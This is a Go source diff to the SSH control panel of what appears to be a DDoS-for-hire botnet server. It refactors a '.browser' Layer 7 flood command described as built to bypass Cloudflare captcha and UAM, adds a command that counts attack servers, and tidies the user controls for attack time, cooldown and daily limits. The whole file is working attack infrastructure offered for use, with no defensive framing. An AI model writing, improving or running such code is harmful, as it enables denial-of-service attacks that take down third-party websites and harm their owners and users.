@@ -561,7 +561,7 @@ func AdminSSH(conn net.Conn) {
 		case "methods_layer7", "methods_l7":
 			rows := [][]string{
 				{".http", ansiCommands + "HTTP flood (Layer 7)" + ansiReset},
-				{"!browser", ansiCommands + "Browser emulation optimized for CF Captcha & UAM" + ansiReset},
+				{".browser", ansiCommands + "Browser emulation optimized for CF Captcha & UAM" + ansiReset},
 			}
 			writeGradientTable(session.Conn, []string{"Layer 7 Methods", "Description"}, rows)
 
@@ -688,6 +688,9 @@ func AdminSSH(conn net.Conn) {
 
 			continue
 
+			// Bots command
+			//==============================================================================================================================================================================================================================================================================================================================//
+
 		case "bots":
 			// Non-admins can not see the different types of client sources connected
 			if !session.User.Admin {
@@ -701,6 +704,26 @@ func AdminSSH(conn net.Conn) {
 			}
 
 			continue
+
+			//Servers L7
+			//==============================================================================================================================================================================================================================================================================================================================//
+
+		case "servers":
+			// Solo admin
+			if !session.User.Admin {
+				session.Conn.Write([]byte(ansiError + "You do not have permission to view servers" + ansiReset + "\r\n"))
+				continue
+			}
+			workersMux.RLock()
+			total := len(workers)
+			workersMux.RUnlock()
+			session.Conn.Write([]byte(fmt.Sprintf("%sServers%s: %s%d%s\r\n",
+				ansiPrimary, ansiReset, ansiNumbers, total, ansiReset)))
+			continue
+
+			// API examples/help
+			//==============================================================================================================================================================================================================================================================================================================================//
+
 		case "api": // API examples/help
 			if !session.User.API && !session.User.Admin {
 				session.Conn.Write([]byte(ansiWarning + "You don't have API access!" + ansiReset + "\r\n"))
@@ -751,6 +774,9 @@ func AdminSSH(conn net.Conn) {
 
 			session.Conn.Write([]byte(fmt.Sprintf("%sHey %s, it seems you have API access!%s\r\n", ansiSystem, session.User.Username, ansiReset)))
 
+			// Admin command
+			//==============================================================================================================================================================================================================================================================================================================================//
+
 		case "admin":
 			if !session.User.Admin {
 				session.Conn.Write([]byte(ansiWarning + "You don't have the access for that!" + ansiReset + "\r\n"))
@@ -797,6 +823,10 @@ func AdminSSH(conn net.Conn) {
 
 			session.Conn.Write([]byte(fmt.Sprintf("%sSuccessfully changed user's admin status to %v!%s\r\n", ansiSuccess, status, ansiReset)))
 			continue
+
+			// Reseller command
+			//==============================================================================================================================================================================================================================================================================================================================//
+
 		case "reseller":
 			if !session.User.Admin {
 				session.Conn.Write([]byte(ansiWarning + "You don't have the access for that!" + ansiReset + "\r\n"))
@@ -845,6 +875,9 @@ func AdminSSH(conn net.Conn) {
 			session.Conn.Write([]byte(fmt.Sprintf("%sSuccessfully changed users reseller status to %v!%s\r\n", ansiSuccess, status, ansiReset)))
 			continue
 
+			// Maxtime command
+			//==============================================================================================================================================================================================================================================================================================================================//
+
 		case "maxtime":
 			if !session.User.Admin {
 				session.Conn.Write([]byte(ansiWarning + "You don't have the access for that!" + ansiReset + "\r\n"))
@@ -888,6 +921,9 @@ func AdminSSH(conn net.Conn) {
 			session.Conn.Write([]byte(fmt.Sprintf("%sSuccessfully changed users maxtime status to %s%d%s!%s\r\n", ansiSuccess, ansiNumbers, maxtime, ansiSuccess, ansiReset)))
 			continue
 
+			// Cooldown command
+			//==============================================================================================================================================================================================================================================================================================================================//
+
 		case "cooldown":
 			if !session.User.Admin {
 				session.Conn.Write([]byte(ansiWarning + "You don't have the access for that!" + ansiReset + "\r\n"))
@@ -924,12 +960,15 @@ func AdminSSH(conn net.Conn) {
 			}
 
 			if err := ModifyField(user, "cooldown", cooldown); err != nil {
-				session.Conn.Write([]byte(ansiError + "Failed to modify users maxtime status" + ansiReset + "\r\n"))
+				session.Conn.Write([]byte(ansiError + "Failed to modify users cooldown status" + ansiReset + "\r\n"))
 				continue
 			}
 
 			session.Conn.Write([]byte(fmt.Sprintf("%sSuccessfully changed users cooldown status to %s%d%s!%s\r\n", ansiSuccess, ansiNumbers, cooldown, ansiSuccess, ansiReset)))
 			continue
+
+			// Conns command
+			//==============================================================================================================================================================================================================================================================================================================================//
 
 		case "conns":
 			if !session.User.Admin {
@@ -973,6 +1012,9 @@ func AdminSSH(conn net.Conn) {
 
 			session.Conn.Write([]byte(fmt.Sprintf("%sSuccessfully changed users conns status to %s%d%s!%s\r\n", ansiSuccess, ansiNumbers, conns, ansiSuccess, ansiReset)))
 			continue
+
+			// Max_daily command
+			//==============================================================================================================================================================================================================================================================================================================================//
 
 		case "max_daily":
 			if !session.User.Admin {
@@ -1606,107 +1648,24 @@ func AdminSSH(conn net.Conn) {
 			session.Conn.Write([]byte(ansiSuccess + "Results" + ansiReset + ":\r\n" + formatted + "\r\n"))
 			continue
 
-			//BROWSER	CASE
-			//============================================================================================================================================================================================================================================================================//
+		//BROWSER	CASE
+		//============================================================================================================================================================================================================================================================================//
 
-		case "!browser":
+		case ".browser":
 			args := strings.Fields(command)
-			if len(args) < 4 {
-				session.Conn.Write([]byte(ansiError + "Usage: !browser <url> <rate> <time>" + ansiReset + "\r\n"))
+			if len(args) != 4 { // .browser + url + time + rate
+				session.Conn.Write([]byte(ansiError + "Usage: .browser <url> <time> <rate>" + ansiReset + "\r\n"))
 				continue
 			}
-			url := args[1]
-			rate, err := strconv.Atoi(args[2])
-			if err != nil || rate < 1 || rate > 250 {
-				session.Conn.Write([]byte(ansiError + "Rate must be 1-250" + ansiReset + "\r\n"))
-				continue
-			}
-			duration, err := strconv.Atoi(args[3])
-			if err != nil || duration <= 0 {
-				session.Conn.Write([]byte(ansiError + "Invalid duration" + ansiReset + "\r\n"))
-				continue
-			}
-			if duration > session.User.Maxtime {
-				session.Conn.Write([]byte(fmt.Sprintf(ansiError+"Duration exceeds your maxtime (%d seconds)"+ansiReset+"\r\n", session.User.Maxtime)))
-				continue
-			}
-
-			// Límite diario
-			sent, err := UserOngoingAttacks(session.User.Username, time.Date(time.Now().Year(), time.Now().Month(), time.Now().Day(), 0, 0, 0, 0, time.Now().Location()))
-			if err == nil && len(sent) >= session.User.MaxDaily && !session.User.Admin {
-				session.Conn.Write([]byte(ansiError + "Daily attack limit exceeded" + ansiReset + "\r\n"))
-				continue
-			}
-
-			// Cooldown
-			thererunning, _ := UserOngoingAttacks(session.User.Username, time.Now())
-			if len(thererunning) > 0 && session.User.Cooldown > 0 {
-				recent := thererunning[0]
-				for _, a := range thererunning {
-					if a.Sent > recent.Sent {
-						recent = a
-					}
-				}
-				if recent.Sent+int64(session.User.Cooldown) > time.Now().Unix() {
-					session.Conn.Write([]byte(ansiError + "You are in cooldown" + ansiReset + "\r\n"))
-					continue
-				}
-			}
-
-			// Límite de ataques concurrentes (para este usuario)
-			running, err := UserOngoingAttacks(session.User.Username, time.Now())
+			// args[1] = url, args[2] = time, args[3] = rate
+			attack, err := ParseL7Attack("browser", args[1:], session.User)
 			if err != nil {
-				session.Conn.Write([]byte(ansiError + "Error checking concurrent attacks" + ansiReset + "\r\n"))
+				session.Conn.Write([]byte(ansiError + err.Error() + ansiReset + "\r\n"))
 				continue
 			}
-			if session.User.Conns > 0 && len(running) >= session.User.Conns {
-				session.Conn.Write([]byte(ansiError + "Concurrent attack limit exceeded" + ansiReset + "\r\n"))
-				continue
-			}
-
-			// Límite global de ataques simultáneos
-			globalRunning, err := OngoingAttacks(time.Now())
-			if err != nil || len(globalRunning) >= Options.Templates.Attacks.MaximumOngoing {
-				session.Conn.Write([]byte(ansiError + "Maximum global attack slots reached" + ansiReset + "\r\n"))
-				continue
-			}
-
-			// Comprobar que hay workers conectados
-			workersMux.RLock()
-			workerCount := len(workers)
-			workersMux.RUnlock()
-			if workerCount == 0 {
-				session.Conn.Write([]byte(ansiError + "No L7 workers available" + ansiReset + "\r\n"))
-				continue
-			}
-
-			// Enviar comando a todos los workers
-			cmd := map[string]interface{}{
-				"type":     "attack",
-				"method":   "browser",
-				"url":      url,
-				"rate":     rate,
-				"duration": duration,
-				"user":     session.User.Username,
-			}
-			SendToWorkers(cmd)
-
-			// Registrar ataque en la base de datos (opcional)
-			if err := LogAttack(&AttackLog{
-				Target:   url,
-				Duration: duration,
-				Flags:    fmt.Sprintf("rate=%d", rate),
-				Sent:     time.Now().Unix(),
-				Finish:   time.Now().Add(time.Duration(duration) * time.Second).Unix(),
-				User:     session.User.Username,
-				Devices:  0, // No se usan bots
-			}); err != nil {
-				session.Conn.Write([]byte(ansiError + "Failed to log attack" + ansiReset + "\r\n"))
-				continue
-			}
+			SendL7Attack(attack)
 			face := purpleGradientText("X_X")
-			session.Conn.Write([]byte(ansiSuccess + "Successfully" + ansiReset + " " + ansiCommands + "sent attack to " + url + " for " + strconv.Itoa(duration) + " seconds with rate " + strconv.Itoa(rate) + " using " + strconv.Itoa(workerCount) + " servers" + ansiReset + face + ansiReset + "\r\n"))
-
+			session.Conn.Write([]byte(ansiSuccess + "Attack sent to " + attack.URL + " for " + strconv.Itoa(attack.Duration) + " seconds " + face + ansiReset + "\r\n"))
 			continue
 
 			//Default case handles attack commands and unknown commands
